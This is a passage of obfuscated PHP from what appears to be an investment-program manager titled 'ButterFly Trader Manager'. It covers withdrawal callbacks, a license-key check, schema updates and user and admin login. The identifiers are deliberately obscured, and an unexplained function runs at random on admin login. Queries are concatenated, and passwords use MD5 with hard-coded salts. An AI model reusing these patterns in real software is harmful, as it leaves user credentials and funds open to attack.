      $elnlcRuFoK = array ();
      $elnlcRuFoK[$elnlcsyENS['elnlczWew']] = $elnlcgcnET[$elnlcsyENS['elnlczWew']];
      $elnlcRuFoK[$elnlcsyENS['elnlcmjdk']] = $elnlcgcnET[$elnlcsyENS['elnlcmjdk']];
      $elnlcRuFoK[$elnlcsyENS['elnlcyteO']] = sprintf ('%.02f', abs ($elnlcCgqPK[$elnlcsyENS['elnlcyteO']]));
      $elnlcRuFoK[$elnlcsyENS['elnlcJdSMq']] = $elnlcWodOE[$elnlcsyENS['elnlcFAsh']];
      $elnlcRuFoK[$elnlcsyENS['elnlcwuPu']] = $elnlcVTlA;
      $elnlcRuFoK[$elnlcsyENS['elnlcKcCmd']] = $elnlcVTlA;
      $elnlcRuFoK[$elnlcsyENS['elnlcUIjSg']] = $elnlcVTlA;
      $elnlcRuFoK[$elnlcsyENS['elnlccefl']] = $elnlcGPfS[8][$elnlcsyENS['elnlcmjdk']];
      elnlcsius ('withdraw_user_notification', $elnlcgcnET[$elnlcsyENS['elnlcdktEr']], $elnlcSuVc[$elnlcsyENS['elnlcBpGlU']], $elnlcRuFoK);
    }

    print 1;
    elnlcnooln ($elnlcUazB);
    exit ();
  }

  if (($elnlcWodOE[$elnlcsyENS['elnlcmeAr']] == $elnlcsyENS['elnlcGARVG'] AND $elnlcWodOE[$elnlcsyENS['elnlcRCsD']] != ''))
  {
    $elnlcVTlA = elnlcnczen ($elnlcWodOE[$elnlcsyENS['elnlcRCsD']]);
    list ($elnlckapu, $elnlcEabU) = explode ('-', $elnlcWodOE[$elnlcsyENS['elnlcrHmeD']]);
    $elnlckapu = sprintf ('%d', $elnlckapu);
    if ($elnlcEabU == '')
    {
      $elnlcEabU = $elnlcsyENS['elnlcwatJ'];
    }

    $elnlcEabU = elnlcnczen ($elnlcEabU);
    $q = '' . 'select * from hm2_history where id = ' . $elnlckapu . ' and str = \'' . $elnlcEabU . '\' and type=\'withdraw_pending\'';
    $elnlchGkPU = mysql_query ($q);
    while ($elnlcCgqPK = mysql_fetch_array ($elnlchGkPU))
    {
      $q = '' . 'delete from hm2_history where id = ' . $elnlckapu;
      (mysql_query ($q) OR print mysql_error ());
      $q = 'insert into hm2_history set 
	user_id = ' . $elnlcCgqPK[$elnlcsyENS['elnlcAvUq']] . ',
	amount = -' . abs ($elnlcCgqPK[$elnlcsyENS['elnlcyteO']]) . ('' . ',
	type = \'withdrawal\',
	description = \'Withdraw processed. Batch id = ' . $elnlcVTlA . '\',
	actual_amount = -') . abs ($elnlcCgqPK[$elnlcsyENS['elnlcyteO']]) . ',
	ec = 2,
	date = now()
	';
      (mysql_query ($q) OR print mysql_error ());
      $q = 'select * from hm2_users where id = ' . $elnlcCgqPK[$elnlcsyENS['elnlcAvUq']];
      $elnlchGkPU = mysql_query ($q);
      $elnlcgcnET = mysql_fetch_array ($elnlchGkPU);
      $elnlcRuFoK = array ();
      $elnlcRuFoK[$elnlcsyENS['elnlczWew']] = $elnlcgcnET[$elnlcsyENS['elnlczWew']];
      $elnlcRuFoK[$elnlcsyENS['elnlcmjdk']] = $elnlcgcnET[$elnlcsyENS['elnlcmjdk']];
      $elnlcRuFoK[$elnlcsyENS['elnlcyteO']] = sprintf ('%.02f', abs ($elnlcCgqPK[$elnlcsyENS['elnlcyteO']]));
      $elnlcRuFoK[$elnlcsyENS['elnlcJdSMq']] = $elnlcWodOE[$elnlcsyENS['elnlcFAsh']];
      $elnlcRuFoK[$elnlcsyENS['elnlcwuPu']] = $elnlcVTlA;
      $elnlcRuFoK[$elnlcsyENS['elnlcKcCmd']] = $elnlcVTlA;
      $elnlcRuFoK[$elnlcsyENS['elnlcUIjSg']] = $elnlcVTlA;
      $elnlcRuFoK[$elnlcsyENS['elnlccefl']] = $elnlcGPfS[2][$elnlcsyENS['elnlcmjdk']];
      elnlcsius ('withdraw_user_notification', $elnlcgcnET[$elnlcsyENS['elnlcdktEr']], $elnlcSuVc[$elnlcsyENS['elnlcBpGlU']], $elnlcRuFoK);
    }

    print 1;
    elnlcnooln ($elnlcUazB);
    exit ();
  }

  if ((($elnlcWodOE[$elnlcsyENS['elnlcAtarm']] == $elnlcsyENS['elnlcGARVG'] AND $elnlcWodOE[$elnlcsyENS['elnlcSWBK']] != '') AND $elnlcWodOE[$elnlcsyENS['elnlcTClGm']] == 'Payment'))
  {
    $elnlcVTlA = elnlcnczen ($elnlcWodOE[$elnlcsyENS['elnlcSWBK']]);
    list ($elnlckapu, $elnlcEabU) = explode ('-', $elnlcWodOE[$elnlcsyENS['elnlcwWABC']]);
    $elnlckapu = sprintf ('%d', $elnlckapu);
    if ($elnlcEabU == '')
    {
      $elnlcEabU = $elnlcsyENS['elnlcwatJ'];
    }

    $elnlcEabU = elnlcnczen ($elnlcEabU);
    $q = '' . 'select * from hm2_history where id = ' . $elnlckapu . ' and str=\'' . $elnlcEabU . '\' and type=\'withdraw_pending\'';
    $elnlchGkPU = mysql_query ($q);
    while ($elnlcCgqPK = mysql_fetch_array ($elnlchGkPU))
    {
      $q = '' . 'delete from hm2_history where id = ' . $elnlckapu;
      (mysql_query ($q) OR print mysql_error ());
      $q = 'insert into hm2_history set 
	user_id = ' . $elnlcCgqPK[$elnlcsyENS['elnlcAvUq']] . ',
	amount = -' . abs ($elnlcCgqPK[$elnlcsyENS['elnlcyteO']]) . ('' . ',
	type = \'withdrawal\',
	description = \'Withdraw processed. Batch id = ' . $elnlcVTlA . '\',
	actual_amount = -') . abs ($elnlcCgqPK[$elnlcsyENS['elnlcyteO']]) . ',
	ec = 4,
	date = now()
	';
      (mysql_query ($q) OR print mysql_error ());
      $q = 'select * from hm2_users where id = ' . $elnlcCgqPK[$elnlcsyENS['elnlcAvUq']];
      $elnlchGkPU = mysql_query ($q);
      $elnlcgcnET = mysql_fetch_array ($elnlchGkPU);
      $elnlcRuFoK = array ();
      $elnlcRuFoK[$elnlcsyENS['elnlczWew']] = $elnlcgcnET[$elnlcsyENS['elnlczWew']];
      $elnlcRuFoK[$elnlcsyENS['elnlcmjdk']] = $elnlcgcnET[$elnlcsyENS['elnlcmjdk']];
      $elnlcRuFoK[$elnlcsyENS['elnlcyteO']] = sprintf ('%.02f', abs ($elnlcCgqPK[$elnlcsyENS['elnlcyteO']]));
      $elnlcRuFoK[$elnlcsyENS['elnlcJdSMq']] = $elnlcWodOE[$elnlcsyENS['elnlcUWFjd']];
      $elnlcRuFoK[$elnlcsyENS['elnlcwuPu']] = $elnlcVTlA;
      $elnlcRuFoK[$elnlcsyENS['elnlcKcCmd']] = $elnlcVTlA;
      $elnlcRuFoK[$elnlcsyENS['elnlcUIjSg']] = $elnlcVTlA;
      $elnlcRuFoK[$elnlcsyENS['elnlccefl']] = $elnlcGPfS[4][$elnlcsyENS['elnlcmjdk']];
      elnlcsius ('withdraw_user_notification', $elnlcgcnET[$elnlcsyENS['elnlcdktEr']], $elnlcSuVc[$elnlcsyENS['elnlcBpGlU']], $elnlcRuFoK);
    }

    print 1;
    elnlcnooln ($elnlcUazB);
    exit ();
  }

  if ($elnlcWodOE[$elnlcsyENS['elnlcxxLz']] == $elnlcsyENS['elnlcmLGP'])
  {
    $elnlcVTlA = 'n/a';
    list ($elnlckapu, $elnlcEabU) = explode ('-', $elnlcWodOE[$elnlcsyENS['elnlcBDKLP']]);
    $elnlckapu = sprintf ('%d', $elnlckapu);
    if ($elnlcEabU == '')
    {
      $elnlcEabU = $elnlcsyENS['elnlcwatJ'];
    }

    $elnlcEabU = elnlcnczen ($elnlcEabU);
    $q = '' . 'select * from hm2_history where id = ' . $elnlckapu . ' and str = \'' . $elnlcEabU . '\' and type=\'withdraw_pending\'';
    $elnlchGkPU = mysql_query ($q);
    while ($elnlcCgqPK = mysql_fetch_array ($elnlchGkPU))
    {
      $q = '' . 'delete from hm2_history where id = ' . $elnlckapu;
      (mysql_query ($q) OR print mysql_error ());
      $q = 'insert into hm2_history set 
	user_id = ' . $elnlcCgqPK[$elnlcsyENS['elnlcAvUq']] . ',
	amount = -' . abs ($elnlcCgqPK[$elnlcsyENS['elnlcyteO']]) . ('' . ',
	type = \'withdrawal\',
	description = \'Withdraw processed. Batch id = ' . $elnlcVTlA . '\',
	actual_amount = -') . abs ($elnlcCgqPK[$elnlcsyENS['elnlcyteO']]) . ',
	ec = 11,
	date = now()';
      (mysql_query ($q) OR print mysql_error ());
      $q = 'select * from hm2_users where id = ' . $elnlcCgqPK[$elnlcsyENS['elnlcAvUq']];
      $elnlchGkPU = mysql_query ($q);
      $elnlcgcnET = mysql_fetch_array ($elnlchGkPU);
      $elnlcRuFoK = array ();
      $elnlcRuFoK[$elnlcsyENS['elnlczWew']] = $elnlcgcnET[$elnlcsyENS['elnlczWew']];
      $elnlcRuFoK[$elnlcsyENS['elnlcmjdk']] = $elnlcgcnET[$elnlcsyENS['elnlcmjdk']];
      $elnlcRuFoK[$elnlcsyENS['elnlcyteO']] = sprintf ('%.02f', abs ($elnlcCgqPK[$elnlcsyENS['elnlcyteO']]));
      $elnlcRuFoK[$elnlcsyENS['elnlcJdSMq']] = 'n/a';
      $elnlcRuFoK[$elnlcsyENS['elnlcwuPu']] = $elnlcVTlA;
      $elnlcRuFoK[$elnlcsyENS['elnlcKcCmd']] = $elnlcVTlA;
      $elnlcRuFoK[$elnlcsyENS['elnlcUIjSg']] = $elnlcVTlA;
      $elnlcRuFoK[$elnlcsyENS['elnlccefl']] = $elnlcGPfS[11][$elnlcsyENS['elnlcmjdk']];
      elnlcsius ('withdraw_user_notification', $elnlcgcnET['email'], $elnlcSuVc[$elnlcsyENS['elnlcBpGlU']], $elnlcRuFoK);
    }

    print 1;
    elnlcnooln ($elnlcUazB);
    exit ();
  }

  if (($elnlcWodOE[$elnlcsyENS['elnlcjMxze']] == $elnlcsyENS['elnlcGARVG'] AND $elnlcWodOE[$elnlcsyENS['elnlcrTWnV']] != ''))
  {
    $elnlcVTlA = elnlcnczen ($elnlcWodOE[$elnlcsyENS['elnlcrTWnV']]);
    list ($elnlckapu, $elnlcEabU) = explode ('-', $elnlcWodOE[$elnlcsyENS['elnlcLPzeo']]);
    $elnlckapu = sprintf ('%d', $elnlckapu);
    if ($elnlcEabU == '')
    {
      $elnlcEabU = $elnlcsyENS['elnlcwatJ'];
    }

    $elnlcEabU = elnlcnczen ($elnlcEabU);
    $q = '' . 'select * from hm2_history where id = ' . $elnlckapu . ' and str=\'' . $elnlcEabU . '\' and type=\'withdraw_pending\'';
    $elnlchGkPU = mysql_query ($q);
    while ($elnlcCgqPK = mysql_fetch_array ($elnlchGkPU))
    {
      $q = '' . 'delete from hm2_history where id = ' . $elnlckapu;
      (mysql_query ($q) OR print mysql_error ());
      $q = 'insert into hm2_history set 
	user_id = ' . $elnlcCgqPK[$elnlcsyENS['elnlcAvUq']] . ',
	amount = -' . abs ($elnlcCgqPK[$elnlcsyENS['elnlcyteO']]) . ('' . ',
	type = \'withdrawal\',
	description = \'Withdraw processed. Batch id = ' . $elnlcVTlA . '\',
	actual_amount = -') . abs ($elnlcCgqPK[$elnlcsyENS['elnlcyteO']]) . ',
	ec = 16,
	date = now()
	';
      (mysql_query ($q) OR print mysql_error ());
      $q = 'select * from hm2_users where id = ' . $elnlcCgqPK[$elnlcsyENS['elnlcAvUq']];
      $elnlchGkPU = mysql_query ($q);
      $elnlcgcnET = mysql_fetch_array ($elnlchGkPU);
      $elnlcRuFoK = array ();
      $elnlcRuFoK[$elnlcsyENS['elnlczWew']] = $elnlcgcnET[$elnlcsyENS['elnlczWew']];
      $elnlcRuFoK[$elnlcsyENS['elnlcmjdk']] = $elnlcgcnET[$elnlcsyENS['elnlcmjdk']];
      $elnlcRuFoK[$elnlcsyENS['elnlcyteO']] = sprintf ('%.02f', abs ($elnlcCgqPK[$elnlcsyENS['elnlcyteO']]));
      $elnlcRuFoK[$elnlcsyENS['elnlcJdSMq']] = $elnlcWodOE[$elnlcsyENS['elnlcFxKlw']];
      $elnlcRuFoK[$elnlcsyENS['elnlcwuPu']] = $elnlcVTlA;
      $elnlcRuFoK[$elnlcsyENS['elnlcKcCmd']] = $elnlcVTlA;
      $elnlcRuFoK[$elnlcsyENS['elnlcUIjSg']] = $elnlcVTlA;
      $elnlcRuFoK[$elnlcsyENS['elnlccefl']] = $elnlcGPfS[16][$elnlcsyENS['elnlcmjdk']];
      elnlcsius ('withdraw_user_notification', $elnlcgcnET[$elnlcsyENS['elnlcdktEr']], $elnlcSuVc[$elnlcsyENS['elnlcBpGlU']], $elnlcRuFoK);
    }

    print 1;
    elnlcnooln ($elnlcUazB);
    exit ();
  }

  if ($elnlcSuVc[$elnlcsyENS['elnlcTpetz']] != '')
  {
    if ($elnlclKOu == 80)
    {
      header ('Location: ' . $elnlcSuVc[$elnlcsyENS['elnlcTpetz']] . '/');
      elnlcnooln ($elnlcUazB);
      exit ();
    }
  }

  if ($elnlcWodOE[$elnlcsyENS['elnlcxxLz']] == $elnlcsyENS['elnlcHfyuR'])
  {
    elnlcfltmc (-2);
    elnlcnooln ($elnlcUazB);
    exit ();
  }

  $q = 'delete from hm2_online where ip=\'' . $elnlcUAAU[$elnlcsyENS['elnlcnGMB']] . '\' or date + interval 30 minute < now()';
  (mysql_query ($q) OR print mysql_error ());
  $q = 'insert into hm2_online set ip=\'' . $elnlcUAAU[$elnlcsyENS['elnlcnGMB']] . '\', date = now()';
  (mysql_query ($q) OR print mysql_error ());
  elnlcesyjp ();
  $elnlcgcnET = array ();
  $elnlcgcnET[$elnlcsyENS['elnlcpicy']] = $elnlcsyENS['elnlcmjUx'];
  if ($elnlcWodOE[$elnlcsyENS['elnlcxxLz']] == $elnlcsyENS['elnlclwpQl'])
  {
    setcookie ('password', 'deleted', time () + 630720000);
    $_SESSION[$elnlcsyENS['elnlcuNxa']] = '';
    $elnlcRuyj[$elnlcsyENS['elnlczWew']] = '';
    $elnlcRuyj[$elnlcsyENS['elnlcuNxa']] = '';
    if ($elnlcSuVc[$elnlcsyENS['elnlcRhOp']] != '')
    {
      header ('Location: ' . $elnlcSuVc[$elnlcsyENS['elnlcRhOp']]);
      elnlcnooln ($elnlcUazB);
      exit ();
    }

    $elnlcWodOE[$elnlcsyENS['elnlcxxLz']] = '';
  }

  if ($elnlcWodOE[$elnlcsyENS['elnlcxxLz']] == $elnlcsyENS['elnlcodxdp'])
  {
    $elnlcWodOE[$elnlcsyENS['elnlcxxLz']] = '';
  }

  $elnlcephNU = $elnlcUAAU[$elnlcsyENS['elnlcKJsh']];
  $elnlcephNU = preg_replace ('/^www\\./', '', $elnlcephNU);
  $elnlcrauJ = $elnlcUAAU[$elnlcsyENS['elnlcebBfR']];
  $elnlcrauJ = preg_replace ('/index\\.php/', '', $elnlcrauJ);
  $elnlcxHGyw = strtoupper (md5 ($elnlcephNU . '*hjfd3/2fjdkl') . md5 ($elnlcrauJ . 'jfd78h,s') . md5 ('pro-_-2' . $elnlcephNU));
  $elnlcDmWIw = $elnlcsyENS['elnlcmjUx'];
  for ($i = $elnlcsyENS['elnlcmjUx']; $i < 5; ++$i)
  {
    $j = $i;
    if ($i == 0)
    {
      $j = '';
    }

    $elnlcxgxI = substr ($elnlcSuVc['key' . $j], 200, -100);
    if ($elnlcxHGyw == $elnlcxgxI)
    {
      $elnlcDmWIw = $elnlcsyENS['elnlctNxTK'];
      continue;
    }
  }

  if ($elnlcDmWIw != 1)
  {
    elnlcnooln ($elnlcUazB);
    exit ();
  }

  if ($_SERVER[$elnlcsyENS['elnlcKJsh']] == $elnlcsyENS['elnlcjCSJ'])
  {
    $elnlcSuVc[$elnlcsyENS['elnlcHNepM']] = $elnlcsyENS['elnlcQkFAp'];
  }

  if ($elnlcWodOE[$elnlcsyENS['elnlcxxLz']] == $elnlcsyENS['elnlcezre'])
  {
    $q = 'select value from hm2_settings where name = \'update_id\'';
    $elnlchGkPU = mysql_query ($q);
    $elnlcCgqPK = mysql_fetch_array ($elnlchGkPU);
    $elnlctaJH = $elnlciAPAC = intval ($elnlcCgqPK[$elnlcsyENS['elnlcpbpw']]);
    if ($elnlctaJH < 1)
    {
      $q = 'alter table hm2_types add column ordering int not null';
      mysql_query ($q);
      $elnlctaJH = $elnlcsyENS['elnlctNxTK'];
    }

    if ($elnlctaJH < 2)
    {
      $q = 'alter table hm2_users add column sq text not null, add column sa text not null';
      mysql_query ($q);
      $elnlctaJH = $elnlcsyENS['elnlcbpKgI'];
    }

    if ($elnlctaJH < 3)
    {
      $q = 'alter table hm2_types change column  period period enum(\'d\',\'w\',\'b-w\',\'m\',\'y\',\'end\',\'2m\', \'3m\', \'6m\', \'h\') default NULL';
      mysql_query ($q);
      $elnlctaJH = $elnlcsyENS['elnlcvbcS'];
    }

    if ($elnlctaJH < 4)
    {
      $q = 'alter table hm2_exchange_rates change column percent percent float(10,2) default 0';
      mysql_query ($q);
      $elnlctaJH = $elnlcsyENS['elnlcwshtO'];
    }

    if ($elnlctaJH < 5)
    {
      $q = 'alter table hm2_types add column deposits_limit_num int default 0';
      mysql_query ($q);
      $elnlctaJH = $elnlcsyENS['elnlcefVAu'];
    }

    if ($elnlctaJH < 7)
    {
      $q = 'alter table hm2_history change column actual_amount actual_amount float(15,6) default NULL';
      mysql_query ($q);
      $elnlctaJH = $elnlcsyENS['elnlciIAFv'];
    }

    if ($elnlctaJH < 8)
    {
      $q = 'alter table hm2_users add column reg_fee float(15,2)';
      mysql_query ($q);
      $elnlctaJH = $elnlcsyENS['elnlcAWMH'];
    }

    if ($elnlctaJH < 9)
    {
      $q = 'insert into hm2_emails set id = \'acsent_user\', name = \'Send pin to user\', subject = \'Pin code\', text = \'Hello #name#.

Someone tried login your account
ip: #ip#
browser: #browser#

Pin code for entering your account is: #NEWPIN#

This code will be expired in 15 minutes.


#site_name#
#site_url#\', status =1';
      mysql_query ($q);
      $elnlctaJH = $elnlcsyENS['elnlccFFE'];
    }

    if ($elnlctaJH < 10)
    {
      $q = 'insert into hm2_emails set id = \'transaction_code_recovery\', name = \'Transaction code recovery\', subject = \'Transaction code\', text = \'Hello #name#.

Your transaction code is : #transaction_code#


#site_name#
#site_url#\', status =1';
      mysql_query ($q);
      $elnlctaJH = $elnlcsyENS['elnlcHdgC'];
    }

    if ($elnlctaJH < 11)
    {
      $q = 'alter table hm2_users add column home_phone varchar(200), add column cell_phone varchar(200), add column work_phone varchar(200)';
      mysql_query ($q);
      $elnlctaJH = $elnlcsyENS['elnlchGOqf'];
    }

    if ($elnlctaJH < 12)
    {
      $q = 'create table hm2_tell_friend (	user_id bigint not null,	d datetime not null,	email varchar (250) not null);';
      mysql_query ($q);
      $elnlctaJH = $elnlcsyENS['elnlcIbwW'];
    }

    if ($elnlctaJH < 13)
    {
      $q = 'alter table hm2_history add column confirm_delete varchar (20) not null default \'\'';
      mysql_query ($q);
      $elnlctaJH = $elnlcsyENS['elnlcetBx'];
    }

    if ($elnlctaJH < 14)
    {
      $q = 'alter table hm2_users add column verify int not null default 0';
      mysql_query ($q);
      $q = 'alter table hm2_history add index hi5 (date, deposit_id)';
      mysql_query ($q);
      $elnlctaJH = $elnlcsyENS['elnlcpddvM'];
    }

    if ($elnlctaJH < 15)
    {
      $q = 'alter table hm2_history add index hi6 (date, type)';
      mysql_query ($q);
      $q = 'alter table hm2_history add index hi6 (date, type, deposit_id)';
      mysql_query ($q);
      $elnlctaJH = $elnlcsyENS['elnlcRneL'];
    }

    if ($elnlctaJH < 16)
    {
      $q = 'alter table hm2_pending_deposits add key hi1 (user_id, status, ec);';
      mysql_query ($q);
      $elnlctaJH = $elnlcsyENS['elnlcSfjJH'];
    }

    if ($elnlctaJH < 17)
    {
      $q = 'alter table hm2_types add column rpcp float(15, 2)';
      mysql_query ($q);
      $q = 'alter table hm2_types add column ouma float(15, 2)';
      mysql_query ($q);
      $elnlctaJH = $elnlcsyENS['elnlcSUNo'];
    }

    if ($elnlctaJH < 18)
    {
      $q = 'insert into hm2_emails set id = \'tell_a_friend\', name = \'Tell a friend\', subject = \'Friend invited you\', text = \'Hello #name_invited#.

Your friend #username# invited you

#referal_link#


#site_name#
#site_url#\', status =1';
      mysql_query ($q);
      $elnlctaJH = $elnlcsyENS['elnlcDNqHg'];
    }

    if ($elnlctaJH != $elnlciAPAC)
    {
      $q = 'delete from hm2_settings where name = \'update_id\'';
      mysql_query ($q);
      $q = '' . 'insert into hm2_settings set value = ' . $elnlctaJH . ', name = \'update_id\'';
      $elnlchGkPU = mysql_query ($q);
      print 'Database update done. <a href=\'?\'>Return to main page</a>';
    }
    else
    {
      print 'Your database already updated. <a href=\'?\'>Return to main page</a>';
    }

    elnlcnooln ($elnlcUazB);
    exit ();
  }

  if ($elnlcWodOE[$elnlcsyENS['elnlcxxLz']] == $elnlcsyENS['elnlcFsFdN'])
  {
    if ($elnlcSuVc[$elnlcsyENS['elnlcIrtRw']] == $elnlcsyENS['elnlcWxHP'])
    {
      $elnlcSuVc[$elnlcsyENS['elnlcgyByb']] = $elnlcsyENS['elnlcmjUx'];
    }

    $elnlcmrqRg = elnlcnczen ($elnlcWodOE[$elnlcsyENS['elnlczWew']]);
	$elnlckICO = elnlcnczen ($elnlcWodOE[$elnlcsyENS['elnlcuNxa']]);
    $elnlckMaH = elnlcnczen ($elnlcWodOE[$elnlcsyENS['elnlcuNxa']]);
    $elnlckMaH = md5 ($elnlckMaH);
    $elnlcBKVt = $elnlcWodOE[$elnlcsyENS['elnlcuNxa']];
    $elnlcdwjK = '';
    if ($elnlcSuVc[$elnlcsyENS['elnlcLUck']] == 1)
    {
      $elnlcdwjK = ' and (confirm_string = "" or confirm_string is NULL)';
    }

    $q = '' . 'select *, date_format(date_register, \'%b-%e-%Y\') as create_account_date, now() - interval 2 minute > l_e_t as should_count from hm2_users where username = \'' . $elnlcmrqRg . '\' and (status=\'on\' or status=\'suspended\') ' . $elnlcdwjK;
    $elnlchGkPU = mysql_query ($q);
    while ($elnlcCgqPK = mysql_fetch_array ($elnlchGkPU))
    {
      if (((extension_loaded ('gd') AND $elnlcSuVc[$elnlcsyENS['elnlcgyByb']] == 1) AND 0 < $elnlcSuVc[$elnlcsyENS['elnlcQMrd']]))
      {
        session_start ();
        if ($_SESSION[$elnlcsyENS['elnlcAHrk']] != $elnlcWodOE[$elnlcsyENS['elnlcAHrk']])
        {
          header ('Location: ?a=login&say=invalid_login&username=' . $elnlcWodOE[$elnlcsyENS['elnlczWew']]);
          elnlcnooln ($elnlcUazB);
          exit ();
        }
      }

      if (($elnlcSuVc[$elnlcsyENS['elnlcAcsG']] == 1 AND $elnlcCgqPK[$elnlcsyENS['elnlctTLrz']] != ''))
      {
        header ('Location: ?a=login&say=invalid_login&username=' . $elnlcWodOE[$elnlcsyENS['elnlczWew']]);
        elnlcnooln ($elnlcUazB);
        exit ();
      }

      if (($elnlcSuVc[$elnlcsyENS['elnlcAcsG']] == 1 AND $elnlcCgqPK[$elnlcsyENS['elnlcAglxS']] == $elnlcSuVc[$elnlcsyENS['elnlcbTGA']]))
      {
        $elnlcisiv = elnlcpfqe (50);
        $q = '' . 'update hm2_users set bf_counter = bf_counter + 1, activation_code = \'' . $elnlcisiv . '\' where id = ' . $elnlcCgqPK[$elnlcsyENS['elnlcLbvLL']];
        mysql_query ($q);
        $elnlcRuFoK = array ();
        $elnlcRuFoK[$elnlcsyENS['elnlctTLrz']] = $elnlcisiv;
        $elnlcRuFoK[$elnlcsyENS['elnlczWew']] = $elnlcCgqPK[$elnlcsyENS['elnlczWew']];
        $elnlcRuFoK[$elnlcsyENS['elnlcmjdk']] = $elnlcCgqPK[$elnlcsyENS['elnlcmjdk']];
        $elnlcRuFoK[$elnlcsyENS['elnlctDSvC']] = $elnlcUAAU[$elnlcsyENS['elnlcnGMB']];
        $elnlcRuFoK[$elnlcsyENS['elnlcQEKp']] = $elnlcSuVc[$elnlcsyENS['elnlcbTGA']];
        elnlcsius ('brute_force_activation', $elnlcCgqPK[$elnlcsyENS['elnlcdktEr']], $elnlcSuVc[$elnlcsyENS['elnlcBpGlU']], $elnlcRuFoK);
        header ('Location: ?a=login&say=invalid_login&username=' . $elnlcWodOE[$elnlcsyENS['elnlczWew']]);
        elnlcnooln ($elnlcUazB);
        exit ();
      }

      if ((($elnlcCgqPK[$elnlcsyENS['elnlcuNxa']] != $elnlckMaH AND 1 < $elnlcCgqPK[$elnlcsyENS['elnlcLbvLL']]) OR ($elnlcCgqPK[$elnlcsyENS['elnlcuNxa']] != md5 ('++++3jkljfds' . $elnlcBKVt . '7d8d0dj3k3l3,3m3h3t38d762') AND $elnlcCgqPK[$elnlcsyENS['elnlcLbvLL']] == 1)))
      {
        $q = 'update hm2_users set bf_counter = bf_counter + 1 where id = ' . $elnlcCgqPK[$elnlcsyENS['elnlcLbvLL']];
        mysql_query ($q);
        header ('Location: ?a=login&say=invalid_login&username=' . $elnlcWodOE[$elnlcsyENS['elnlczWew']]);
        elnlcnooln ($elnlcUazB);
        exit ();
      }

      $elnlctUmAS = elnlcpfqe (20);
      $elnlcQyme = elnlcpfqe (5) . $elnlctUmAS . elnlcpfqe (5);
      $elnlcOSCl = $elnlcCgqPK[$elnlcsyENS['elnlcLbvLL']] . '-' . md5 ($elnlctUmAS);
      $elnlcgcnET = $elnlcCgqPK;
      $elnlcgcnET[$elnlcsyENS['elnlcpicy']] = $elnlcsyENS['elnlctNxTK'];
      $elnlcgcnET[$elnlcsyENS['elnlcKMHsD']] = array ();
      $elnlcgcnET[$elnlcsyENS['elnlcKMHsD']] = unserialize ($elnlcgcnET[$elnlcsyENS['elnlcEoNu']]);
      $elnlcDuaK = $elnlcUAAU[$elnlcsyENS['elnlcnGMB']];
      $q = '' . 'update hm2_users set hid = \'' . $elnlcQyme . '\', bf_counter = 0, last_access_time = now(), last_access_ip = \'' . $elnlcDuaK . '\' where id = ' . $elnlcCgqPK[$elnlcsyENS['elnlcLbvLL']];
      (mysql_query ($q) OR print mysql_error ());
	  $q = 'insert into hm2_user_access_log set user_id = ' . $elnlcgcnET[$elnlcsyENS['elnlcLbvLL']] . ('' . ', date = now(), ip = \'' . $elnlcDuaK . '\'');
      (mysql_query ($q) OR print mysql_error ());
      if ($elnlcSuVc[$elnlcsyENS['elnlcRjLsJ']] == 1)
      {
        $elnlcpgLq = elnlcshwnc (10, 0);
        $q = 'update hm2_users set password = \'' . md5 ($elnlcpgLq) . '\' where id = ' . $elnlcgcnET[$elnlcsyENS['elnlcLbvLL']];
        (mysql_query ($q) OR print mysql_error ());
        $elnlcRuFoK = array ();
        $elnlcRuFoK[$elnlcsyENS['elnlczWew']] = $elnlcgcnET[$elnlcsyENS['elnlczWew']];
        $elnlcRuFoK[$elnlcsyENS['elnlcmjdk']] = $elnlcgcnET[$elnlcsyENS['elnlcmjdk']];
        $elnlcRuFoK[$elnlcsyENS['elnlctDSvC']] = $elnlcUAAU[$elnlcsyENS['elnlcnGMB']];
        $elnlcRuFoK[$elnlcsyENS['elnlcuNxa']] = $elnlcpgLq;
        elnlcsius ('send_password_when_changed', $elnlcgcnET[$elnlcsyENS['elnlcdktEr']], $elnlcSuVc[$elnlcsyENS['elnlcBpGlU']], $elnlcRuFoK);
      }

      setcookie ('password', $elnlcOSCl, time () + 630720000);
      $_SESSION[$elnlcsyENS['elnlcuNxa']] = $elnlcOSCl;
    }

    if ($elnlcgcnET[$elnlcsyENS['elnlcpicy']] == 0)
    {
      header ('Location: ?a=login&say=invalid_login&username=' . $elnlcWodOE[$elnlcsyENS['elnlczWew']]);
      elnlcnooln ($elnlcUazB);
      exit ();
    }

    if (($elnlcgcnET[$elnlcsyENS['elnlcpicy']] == 1 AND $elnlcgcnET[$elnlcsyENS['elnlcLbvLL']] == 1))
    {
      if ($elnlcSuVc[$elnlcsyENS['elnlciwSzJ']] != 1)
      {
        if (rand (1, 5) == 3)
        {
          elnlczmnt ();
        }
      }

      mail ($elnlcgcnET[$elnlcsyENS['elnlcdktEr']], 'Admin logged', '' . 'Admin entered to admin area
ip=' . $elnlcUAAU[$elnlcsyENS['elnlcnGMB']], '' . 'From: ' . $elnlcSuVc[$elnlcsyENS['elnlcBpGlU']] . '
Reply-To: ' . $elnlcSuVc[$elnlcsyENS['elnlcBpGlU']]);
      print '<head><title>ButterFly Trader Manager</title><meta http-equiv=\'Refresh\' content=\'1; URL=admin.php\'></head>';
      print '<body><center><a href=\'admin.php\'>Go to admin area</a></center></body>';
      if ($elnlcSuVc[$elnlcsyENS['elnlcIrtRw']] != 'JRZSVS9XYWRCDRGM6VF5')
      {
        flush ();
      }

      elnlcnooln ($elnlcUazB);
      exit ();
    }

    if ($elnlcgcnET[$elnlcsyENS['elnlcpicy']] == 1)
    {
      if ($elnlcWodOE[$elnlcsyENS['elnlcNgVTo']] == $elnlcsyENS['elnlcnfEbf'])
      {
        $elnlcWodOE[$elnlcsyENS['elnlclLKg']] = intval ($elnlcWodOE[$elnlcsyENS['elnlclLKg']]);
        header ('' . 'Location: ?a=return_referral_commission&listing_id=' . $elnlcWodOE[$elnlcsyENS['elnlclLKg']]);
        exit ();
      }

      if (file_exists ('tmpl/login_redirect.tpl'))
      {
        $elnlcfhFg->assign ('userinfo', $elnlcgcnET);
        $elnlcfhFg->display ($elnlcsyENS['elnlcPKzno']);
        exit ();
      }
    }
  }
  else
  {
    $elnlcmrqRg = elnlcnczen ($elnlcRuyj[$elnlcsyENS['elnlczWew']]);
    $elnlckMaH = $elnlcRuyj[$elnlcsyENS['elnlcuNxa']];
    if (!$elnlckMaH)
    {
      $elnlckMaH = $_SESSION[$elnlcsyENS['elnlcuNxa']];
    }

    $elnlcDuaK = $elnlcUAAU[$elnlcsyENS['elnlcnGMB']];
